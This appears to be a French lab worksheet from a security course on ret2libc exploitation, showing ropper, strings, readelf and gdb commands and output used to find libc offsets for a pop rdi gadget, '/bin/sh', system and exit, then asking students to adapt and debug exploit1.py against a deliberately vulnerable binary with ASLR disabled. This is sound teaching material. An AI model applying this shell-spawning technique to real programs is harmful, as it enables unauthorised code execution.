# Objectifs: trouver les adresses des varibles:
libc_base_address
ret
pop_rdi
binsh_addr
system_addr
exit_addr

## Installer ropper : 

Ropper est principalement écrit en Python. 

Il s'agit d'un outil open-source pour l'analyse de fichiers binaires et la recherche de gadgets ROP (Return-Oriented Programming), développé par Alexander Margaritov

sudo apt update ; sudo apt install ropper

lancer ropper: ropper (Entrée)

## pop_rdi (000000000002a3e5):

![poprdi gadget](https://raw.githubusercontent.com/adell2024/intro_securite_info/master/02-ret2libc/images/poprdi.png)


## binsh_addr (1d8678):

❯ strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

 1d8678 /bin/sh

## system_addr (0000000000050d70):

❯ readelf -s  /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system

  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

## exit_addr (00000000000455f0):

❯ readelf -s  /usr/lib/x86_64-linux-gnu/libc.so.6 | grep exit

2760: 00000000000455f0    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5

les décalages (offsets) que nous avons découverts ci-dessus seront ajoutés à l'adresse où la libc sera chargée. Puisque l'ASLR est désactivé, cette adresse sera la même à chaque exécution du programme vulnérable et peut être trouvée en examinant l'allocation mémoire du processus.

## libc_base_address (0x00007ffff7c00000):

gdb ./ret2libc -q

gdb-peda$ start

gdb-peda$ vmmap

Start              End                Perm	Name

0x00400000         0x00401000         r--p	/home/insa/intro_securite_info/02-ret2libc/ret2libc

0x00401000         0x00402000         r-xp	/home/insa/intro_securite_info/02-ret2libc/ret2libc

0x00402000         0x00403000         r--p	/home/insa/intro_securite_info/02-ret2libc/ret2libc

0x00403000         0x00404000         r--p	/home/insa/intro_securite_info/02-ret2libc/ret2libc

0x00404000         0x00405000         rw-p	/home/insa/intro_securite_info/02-ret2libc/ret2libc

0x00007ffff7c00000 0x00007ffff7c28000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6 


## exploit1.py

>> Modifiez le script pour utiliser les valeurs correspondant à votre environnement pour les variables mentionnées précédemment.

>> Exécutez votre exploit et observez son échec dû à une violation de segmentation (signal SIGSEGV).

>> Lancez une session GDB, chargez le payload payload1 et exécutez-le pas à pas. Vérifiez que toutes les adresses sont correctement définies, mais constatez que l'exécution complète se termine par une violation de segmentation (segfault).Identifiez la fonction qui génère cette faute.
